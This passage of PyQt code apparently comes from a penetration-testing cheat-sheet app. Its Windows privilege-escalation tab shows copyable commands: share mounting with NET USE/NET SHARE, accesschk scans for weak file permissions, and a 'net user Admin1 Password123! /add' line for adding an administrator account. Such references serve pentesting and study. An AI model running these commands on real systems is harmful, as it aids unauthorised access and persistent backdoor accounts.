        self.wpe_16_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_16_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_16_Scan1.text()))
        self.wpe_16_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_16_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_16_Scan1_Copy)
        label_layout.addWidget(self.wpe_16_Scan1)
        self.tab4_container_layout.insertLayout(195, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_16_divider1
        if hasattr(self, 'wpe_16_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_divider1)
            self.wpe_16_divider1.deleteLater()
        self.wpe_16_divider1 = QFrame()
        self.wpe_16_divider1.setFrameShape(QFrame.HLine)
        self.wpe_16_divider1.setLineWidth(3)
        self.wpe_16_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_16_divider2
        if hasattr(self, 'wpe_16_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_divider2)
            self.wpe_16_divider2.deleteLater()
        self.wpe_16_divider2 = QFrame()
        self.wpe_16_divider2.setFrameShape(QFrame.HLine)
        self.wpe_16_divider2.setLineWidth(3)
        self.wpe_16_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_16_spacer1
        if hasattr(self, 'wpe_16_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_spacer1)
            self.wpe_16_spacer1.deleteLater()
        self.wpe_16_spacer1 = QLabel()
        self.wpe_16_spacer1.setFixedWidth(40)
        self.wpe_16_spacer1.setFixedHeight(50)
     
        # wpe_16_spacer2
        if hasattr(self, 'wpe_16_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_spacer2)
            self.wpe_16_spacer2.deleteLater()
        self.wpe_16_spacer2 = QLabel()
        self.wpe_16_spacer2.setFixedWidth(40)
        self.wpe_16_spacer2.setFixedHeight(50)
     
        # wpe_16 spacer & divider layout
        self.tab4_container_layout.insertWidget(196, self.wpe_16_spacer1)
        self.tab4_container_layout.insertWidget(197, self.wpe_16_divider1)
        self.tab4_container_layout.insertWidget(198, self.wpe_16_divider2)
        self.tab4_container_layout.insertWidget(199, self.wpe_16_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_16_Scan2
        if hasattr(self, 'wpe_16_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan2)
            self.wpe_16_Scan2.deleteLater()
        self.wpe_16_Scan2 = QLabel("NET USE")
        self.wpe_16_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(200,self.wpe_16_Scan2)
     
        # wpe_16_Scan2_Copy
        if hasattr(self, 'wpe_16_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan2_Copy)
            self.wpe_16_Scan2_Copy.deleteLater()
        self.wpe_16_Scan2_Copy = QPushButton()
        self.wpe_16_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_16_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_16_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_16_Scan2.text()))
        self.wpe_16_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_16_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_16_Scan2_Copy)
        label_layout.addWidget(self.wpe_16_Scan2)
        self.tab4_container_layout.insertLayout(201, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_16_divider1
        if hasattr(self, 'wpe_16_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_divider1)
            self.wpe_16_divider1.deleteLater()
        self.wpe_16_divider1 = QFrame()
        self.wpe_16_divider1.setFrameShape(QFrame.HLine)
        self.wpe_16_divider1.setLineWidth(3)
        self.wpe_16_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_16_divider2
        if hasattr(self, 'wpe_16_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_divider2)
            self.wpe_16_divider2.deleteLater()
        self.wpe_16_divider2 = QFrame()
        self.wpe_16_divider2.setFrameShape(QFrame.HLine)
        self.wpe_16_divider2.setLineWidth(3)
        self.wpe_16_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_16_spacer1
        if hasattr(self, 'wpe_16_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_spacer1)
            self.wpe_16_spacer1.deleteLater()
        self.wpe_16_spacer1 = QLabel()
        self.wpe_16_spacer1.setFixedWidth(40)
        self.wpe_16_spacer1.setFixedHeight(50)
     
        # wpe_16_spacer2
        if hasattr(self, 'wpe_16_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_spacer2)
            self.wpe_16_spacer2.deleteLater()
        self.wpe_16_spacer2 = QLabel()
        self.wpe_16_spacer2.setFixedWidth(40)
        self.wpe_16_spacer2.setFixedHeight(50)
     
        # wpe_16 spacer & divider layout
        self.tab4_container_layout.insertWidget(202, self.wpe_16_spacer1)
        self.tab4_container_layout.insertWidget(203, self.wpe_16_divider1)
        self.tab4_container_layout.insertWidget(204, self.wpe_16_divider2)
        self.tab4_container_layout.insertWidget(205, self.wpe_16_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_16_Scan3
        if hasattr(self, 'wpe_16_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan3)
            self.wpe_16_Scan3.deleteLater()
        self.wpe_16_Scan3 = QLabel("[ - CREATE A SHARE ON WINDOWS FROM THE COMMAND LINE ]")
        self.wpe_16_Scan3.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(206,self.wpe_16_Scan3)
     
        # wpe_16_Scan4
        if hasattr(self, 'wpe_16_Scan4'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan4)
            self.wpe_16_Scan4.deleteLater()
        self.wpe_16_Scan4 = QLabel("NET SHARE <sharename>=<drive/folderpath> /remark: \"This is my share.\"")
        self.wpe_16_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(207,self.wpe_16_Scan4)
     
        # wpe_16_Scan4_Copy
        if hasattr(self, 'wpe_16_Scan4_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan4_Copy)
            self.wpe_16_Scan4_Copy.deleteLater()
        self.wpe_16_Scan4_Copy = QPushButton()
        self.wpe_16_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_16_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wpe_16_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_16_Scan4.text()))
        self.wpe_16_Scan4_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_16_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_16_Scan4_Copy)
        label_layout.addWidget(self.wpe_16_Scan4)
        self.tab4_container_layout.insertLayout(208, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_16_divider1
        if hasattr(self, 'wpe_16_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_divider1)
            self.wpe_16_divider1.deleteLater()
        self.wpe_16_divider1 = QFrame()
        self.wpe_16_divider1.setFrameShape(QFrame.HLine)
        self.wpe_16_divider1.setLineWidth(3)
        self.wpe_16_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_16_divider2
        if hasattr(self, 'wpe_16_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_divider2)
            self.wpe_16_divider2.deleteLater()
        self.wpe_16_divider2 = QFrame()
        self.wpe_16_divider2.setFrameShape(QFrame.HLine)
        self.wpe_16_divider2.setLineWidth(3)
        self.wpe_16_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_16_spacer1
        if hasattr(self, 'wpe_16_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_spacer1)
            self.wpe_16_spacer1.deleteLater()
        self.wpe_16_spacer1 = QLabel()
        self.wpe_16_spacer1.setFixedWidth(40)
        self.wpe_16_spacer1.setFixedHeight(50)
     
        # wpe_16_spacer2
        if hasattr(self, 'wpe_16_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_spacer2)
            self.wpe_16_spacer2.deleteLater()
        self.wpe_16_spacer2 = QLabel()
        self.wpe_16_spacer2.setFixedWidth(40)
        self.wpe_16_spacer2.setFixedHeight(50)
     
        # wpe_16 spacer & divider layout
        self.tab4_container_layout.insertWidget(209, self.wpe_16_spacer1)
        self.tab4_container_layout.insertWidget(210, self.wpe_16_divider1)
        self.tab4_container_layout.insertWidget(211, self.wpe_16_divider2)
        self.tab4_container_layout.insertWidget(212, self.wpe_16_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_16_Scan5
        if hasattr(self, 'wpe_16_Scan5'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan5)
            self.wpe_16_Scan5.deleteLater()
        self.wpe_16_Scan5 = QLabel("[ -  MOUNT A WINDOWS SHARE FROM THE COMMAND LINE ]")
        self.wpe_16_Scan5.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(213,self.wpe_16_Scan5)
     
        # wpe_16_Scan6
        if hasattr(self, 'wpe_16_Scan6'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan6)
            self.wpe_16_Scan6.deleteLater()
        self.wpe_16_Scan6 = QLabel("NET USE Z: \\\COMPUTER_NAME\\SHARE_NAME /PERSISTENT:YES")
        self.wpe_16_Scan6.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(214,self.wpe_16_Scan6)
     
        # wpe_16_Scan6_Copy
        if hasattr(self, 'wpe_16_Scan6_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan6_Copy)
            self.wpe_16_Scan6_Copy.deleteLater()
        self.wpe_16_Scan6_Copy = QPushButton()
        self.wpe_16_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_16_Scan6_Copy.setFixedSize(QSize(20,20))
        self.wpe_16_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_16_Scan6.text()))
        self.wpe_16_Scan6_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_16_Scan6 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_16_Scan6_Copy)
        label_layout.addWidget(self.wpe_16_Scan6)
        self.tab4_container_layout.insertLayout(215, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_16_divider1
        if hasattr(self, 'wpe_16_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_divider1)
            self.wpe_16_divider1.deleteLater()
        self.wpe_16_divider1 = QFrame()
        self.wpe_16_divider1.setFrameShape(QFrame.HLine)
        self.wpe_16_divider1.setLineWidth(3)
        self.wpe_16_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_16_divider2
        if hasattr(self, 'wpe_16_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_divider2)
            self.wpe_16_divider2.deleteLater()
        self.wpe_16_divider2 = QFrame()
        self.wpe_16_divider2.setFrameShape(QFrame.HLine)
        self.wpe_16_divider2.setLineWidth(3)
        self.wpe_16_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_16_spacer1
        if hasattr(self, 'wpe_16_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_spacer1)
            self.wpe_16_spacer1.deleteLater()
        self.wpe_16_spacer1 = QLabel()
        self.wpe_16_spacer1.setFixedWidth(40)
        self.wpe_16_spacer1.setFixedHeight(50)
     
        # wpe_16_spacer2
        if hasattr(self, 'wpe_16_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_spacer2)
            self.wpe_16_spacer2.deleteLater()
        self.wpe_16_spacer2 = QLabel()
        self.wpe_16_spacer2.setFixedWidth(40)
        self.wpe_16_spacer2.setFixedHeight(50)
     
        # wpe_16 spacer & divider layout
        self.tab4_container_layout.insertWidget(216, self.wpe_16_spacer1)
        self.tab4_container_layout.insertWidget(217, self.wpe_16_divider1)
        self.tab4_container_layout.insertWidget(218, self.wpe_16_divider2)
        self.tab4_container_layout.insertWidget(219, self.wpe_16_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_16_Scan7
        if hasattr(self, 'wpe_16_Scan7'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan7)
            self.wpe_16_Scan7.deleteLater()
        self.wpe_16_Scan7 = QLabel("[ -  UNMOUNT SHARE ]")
        self.wpe_16_Scan7.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(220,self.wpe_16_Scan7)
     
        # wpe_16_Scan8
        if hasattr(self, 'wpe_16_Scan8'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan8)
            self.wpe_16_Scan8.deleteLater()
        self.wpe_16_Scan8 = QLabel("NET USE Z: /DELETE")
        self.wpe_16_Scan8.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(221,self.wpe_16_Scan8)
     
        # wpe_16_Scan8_Copy
        if hasattr(self, 'wpe_16_Scan8_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan8_Copy)
            self.wpe_16_Scan8_Copy.deleteLater()
        self.wpe_16_Scan8_Copy = QPushButton()
        self.wpe_16_Scan8_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_16_Scan8_Copy.setFixedSize(QSize(20,20))
        self.wpe_16_Scan8_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_16_Scan8.text()))
        self.wpe_16_Scan8_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_16_Scan8 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_16_Scan8_Copy)
        label_layout.addWidget(self.wpe_16_Scan8)
        self.tab4_container_layout.insertLayout(222, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_16_divider1
        if hasattr(self, 'wpe_16_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_divider1)
            self.wpe_16_divider1.deleteLater()
        self.wpe_16_divider1 = QFrame()
        self.wpe_16_divider1.setFrameShape(QFrame.HLine)
        self.wpe_16_divider1.setLineWidth(3)
        self.wpe_16_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_16_divider2
        if hasattr(self, 'wpe_16_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_divider2)
            self.wpe_16_divider2.deleteLater()
        self.wpe_16_divider2 = QFrame()
        self.wpe_16_divider2.setFrameShape(QFrame.HLine)
        self.wpe_16_divider2.setLineWidth(3)
        self.wpe_16_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_16_spacer1
        if hasattr(self, 'wpe_16_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_spacer1)
            self.wpe_16_spacer1.deleteLater()
        self.wpe_16_spacer1 = QLabel()
        self.wpe_16_spacer1.setFixedWidth(40)
        self.wpe_16_spacer1.setFixedHeight(50)
     
        # wpe_16_spacer2
        if hasattr(self, 'wpe_16_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_spacer2)
            self.wpe_16_spacer2.deleteLater()
        self.wpe_16_spacer2 = QLabel()
        self.wpe_16_spacer2.setFixedWidth(40)
        self.wpe_16_spacer2.setFixedHeight(50)
     
        # wpe_16 spacer & divider layout
        self.tab4_container_layout.insertWidget(223, self.wpe_16_spacer1)
        self.tab4_container_layout.insertWidget(224, self.wpe_16_divider1)
        self.tab4_container_layout.insertWidget(225, self.wpe_16_divider2)
        self.tab4_container_layout.insertWidget(226, self.wpe_16_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_16_Scan9
        if hasattr(self, 'wpe_16_Scan9'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan9)
            self.wpe_16_Scan9.deleteLater()
        self.wpe_16_Scan9 = QLabel("[ -  DELETE A SHARE ]")
        self.wpe_16_Scan9.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(227,self.wpe_16_Scan9)
     
        # wpe_16_Scan10
        if hasattr(self, 'wpe_16_Scan10'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan10)
            self.wpe_16_Scan10.deleteLater()
        self.wpe_16_Scan10 = QLabel("NET SHARE /DELETE")
        self.wpe_16_Scan10.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(228,self.wpe_16_Scan10)
     
        # wpe_16_Scan10_Copy
        if hasattr(self, 'wpe_16_Scan10_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan10_Copy)
            self.wpe_16_Scan10_Copy.deleteLater()
        self.wpe_16_Scan10_Copy = QPushButton()
        self.wpe_16_Scan10_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_16_Scan10_Copy.setFixedSize(QSize(20,20))
        self.wpe_16_Scan10_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_16_Scan10.text()))
        self.wpe_16_Scan10_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_16_Scan10 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_16_Scan10_Copy)
        label_layout.addWidget(self.wpe_16_Scan10)
        self.tab4_container_layout.insertLayout(229, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_16_divider1
        if hasattr(self, 'wpe_16_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_divider1)
            self.wpe_16_divider1.deleteLater()
        self.wpe_16_divider1 = QFrame()
        self.wpe_16_divider1.setFrameShape(QFrame.HLine)
        self.wpe_16_divider1.setLineWidth(3)
        self.wpe_16_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_16_divider2
        if hasattr(self, 'wpe_16_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_divider2)
            self.wpe_16_divider2.deleteLater()
        self.wpe_16_divider2 = QFrame()
        self.wpe_16_divider2.setFrameShape(QFrame.HLine)
        self.wpe_16_divider2.setLineWidth(3)
        self.wpe_16_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_16_spacer1
        if hasattr(self, 'wpe_16_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_spacer1)
            self.wpe_16_spacer1.deleteLater()
        self.wpe_16_spacer1 = QLabel()
        self.wpe_16_spacer1.setFixedWidth(40)
        self.wpe_16_spacer1.setFixedHeight(50)
     
        # wpe_16_spacer2
        if hasattr(self, 'wpe_16_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_16_spacer2)
            self.wpe_16_spacer2.deleteLater()
        self.wpe_16_spacer2 = QLabel()
        self.wpe_16_spacer2.setFixedWidth(40)
        self.wpe_16_spacer2.setFixedHeight(50)
     
        # wpe_16 spacer & divider layout
        self.tab4_container_layout.insertWidget(230, self.wpe_16_spacer1)
        self.tab4_container_layout.insertWidget(231, self.wpe_16_divider1)
        self.tab4_container_layout.insertWidget(232, self.wpe_16_divider2)
        self.tab4_container_layout.insertWidget(233, self.wpe_16_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_17
        if hasattr(self, 'wpe_17'):
            self.tab4_container_layout.removeWidget(self.wpe_17)
            self.wpe_17.deleteLater()
        self.wpe_17 = QLabel("[ + Find ALL weak file permissions per drive ]")
        self.wpe_17.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(234,self.wpe_17)
     
        # wpe_17_Scan1
        if hasattr(self, 'wpe_17_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_17_Scan1)
            self.wpe_17_Scan1.deleteLater()
        self.wpe_17_Scan1 = QLabel("accesschk.exe -uwqs Users c:*.*")
        self.wpe_17_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(235,self.wpe_17_Scan1)
     
        # wpe_17_Scan1_Copy
        if hasattr(self, 'wpe_17_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_17_Scan1_Copy)
            self.wpe_17_Scan1_Copy.deleteLater()
        self.wpe_17_Scan1_Copy = QPushButton()
        self.wpe_17_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_17_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_17_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_17_Scan1.text()))
        self.wpe_17_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_17_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_17_Scan1_Copy)
        label_layout.addWidget(self.wpe_17_Scan1)
        self.tab4_container_layout.insertLayout(236, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_17_divider1
        if hasattr(self, 'wpe_17_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_17_divider1)
            self.wpe_17_divider1.deleteLater()
        self.wpe_17_divider1 = QFrame()
        self.wpe_17_divider1.setFrameShape(QFrame.HLine)
        self.wpe_17_divider1.setLineWidth(3)
        self.wpe_17_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_17_divider2
        if hasattr(self, 'wpe_17_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_17_divider2)
            self.wpe_17_divider2.deleteLater()
        self.wpe_17_divider2 = QFrame()
        self.wpe_17_divider2.setFrameShape(QFrame.HLine)
        self.wpe_17_divider2.setLineWidth(3)
        self.wpe_17_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_17_spacer1
        if hasattr(self, 'wpe_17_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_17_spacer1)
            self.wpe_17_spacer1.deleteLater()
        self.wpe_17_spacer1 = QLabel()
        self.wpe_17_spacer1.setFixedWidth(40)
        self.wpe_17_spacer1.setFixedHeight(50)
     
        # wpe_17_spacer2
        if hasattr(self, 'wpe_17_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_17_spacer2)
            self.wpe_17_spacer2.deleteLater()
        self.wpe_17_spacer2 = QLabel()
        self.wpe_17_spacer2.setFixedWidth(40)
        self.wpe_17_spacer2.setFixedHeight(50)
     
        # wpe_17 spacer & divider layout
        self.tab4_container_layout.insertWidget(237, self.wpe_17_spacer1)
        self.tab4_container_layout.insertWidget(238, self.wpe_17_divider1)
        self.tab4_container_layout.insertWidget(239, self.wpe_17_divider2)
        self.tab4_container_layout.insertWidget(240, self.wpe_17_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_18
        if hasattr(self, 'wpe_18'):
            self.tab4_container_layout.removeWidget(self.wpe_18)
            self.wpe_18.deleteLater()
        self.wpe_18 = QLabel("[ + group Authenticated Users ]")
        self.wpe_18.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(241,self.wpe_18)
     
        # wpe_18_Scan1
        if hasattr(self, 'wpe_18_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_18_Scan1)
            self.wpe_18_Scan1.deleteLater()
        self.wpe_18_Scan1 = QLabel("accesschk.exe -uwqs \"Authenticated Users\" c:*.*")
        self.wpe_18_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(242,self.wpe_18_Scan1)
     
        # wpe_18_Scan1_Copy
        if hasattr(self, 'wpe_18_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_18_Scan1_Copy)
            self.wpe_18_Scan1_Copy.deleteLater()
        self.wpe_18_Scan1_Copy = QPushButton()
        self.wpe_18_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_18_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_18_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_18_Scan1.text()))
        self.wpe_18_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_18_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_18_Scan1_Copy)
        label_layout.addWidget(self.wpe_18_Scan1)
        self.tab4_container_layout.insertLayout(243, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_18_divider1
        if hasattr(self, 'wpe_18_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_18_divider1)
            self.wpe_18_divider1.deleteLater()
        self.wpe_18_divider1 = QFrame()
        self.wpe_18_divider1.setFrameShape(QFrame.HLine)
        self.wpe_18_divider1.setLineWidth(3)
        self.wpe_18_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_18_divider2
        if hasattr(self, 'wpe_18_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_18_divider2)
            self.wpe_18_divider2.deleteLater()
        self.wpe_18_divider2 = QFrame()
        self.wpe_18_divider2.setFrameShape(QFrame.HLine)
        self.wpe_18_divider2.setLineWidth(3)
        self.wpe_18_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_18_spacer1
        if hasattr(self, 'wpe_18_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_18_spacer1)
            self.wpe_18_spacer1.deleteLater()
        self.wpe_18_spacer1 = QLabel()
        self.wpe_18_spacer1.setFixedWidth(40)
        self.wpe_18_spacer1.setFixedHeight(50)
     
        # wpe_18_spacer2
        if hasattr(self, 'wpe_18_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_18_spacer2)
            self.wpe_18_spacer2.deleteLater()
        self.wpe_18_spacer2 = QLabel()
        self.wpe_18_spacer2.setFixedWidth(40)
        self.wpe_18_spacer2.setFixedHeight(50)
     
        # wpe_18 spacer & divider layout
        self.tab4_container_layout.insertWidget(244, self.wpe_18_spacer1)
        self.tab4_container_layout.insertWidget(245, self.wpe_18_divider1)
        self.tab4_container_layout.insertWidget(246, self.wpe_18_divider2)
        self.tab4_container_layout.insertWidget(247, self.wpe_18_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_19
        if hasattr(self, 'wpe_19'):
            self.tab4_container_layout.removeWidget(self.wpe_19)
            self.wpe_19.deleteLater()
        self.wpe_19 = QLabel("[ + Add an Administrator User ]")
        self.wpe_19.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(248,self.wpe_19)
     
        # wpe_19_Scan1
        if hasattr(self, 'wpe_19_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_19_Scan1)
            self.wpe_19_Scan1.deleteLater()
        self.wpe_19_Scan1 = QLabel("cmd.exe /c net user Admin1 Password123! /add")
        self.wpe_19_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(249,self.wpe_19_Scan1)
     
        # wpe_19_Scan1_Copy
        if hasattr(self, 'wpe_19_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_19_Scan1_Copy)
            self.wpe_19_Scan1_Copy.deleteLater()
        self.wpe_19_Scan1_Copy = QPushButton()
        self.wpe_19_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_19_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_19_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_19_Scan1.text()))
        self.wpe_19_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_19_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_19_Scan1_Copy)
        label_layout.addWidget(self.wpe_19_Scan1)
        self.tab4_container_layout.insertLayout(250, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_19_divider1
        if hasattr(self, 'wpe_19_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_19_divider1)
            self.wpe_19_divider1.deleteLater()
        self.wpe_19_divider1 = QFrame()
        self.wpe_19_divider1.setFrameShape(QFrame.HLine)
        self.wpe_19_divider1.setLineWidth(3)
        self.wpe_19_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_19_divider2
        if hasattr(self, 'wpe_19_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_19_divider2)
            self.wpe_19_divider2.deleteLater()
        self.wpe_19_divider2 = QFrame()
        self.wpe_19_divider2.setFrameShape(QFrame.HLine)
        self.wpe_19_divider2.setLineWidth(3)
        self.wpe_19_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_19_spacer1
        if hasattr(self, 'wpe_19_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_19_spacer1)
            self.wpe_19_spacer1.deleteLater()
        self.wpe_19_spacer1 = QLabel()
        self.wpe_19_spacer1.setFixedWidth(40)
        self.wpe_19_spacer1.setFixedHeight(50)
     
        # wpe_19_spacer2
        if hasattr(self, 'wpe_19_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_19_spacer2)
            self.wpe_19_spacer2.deleteLater()
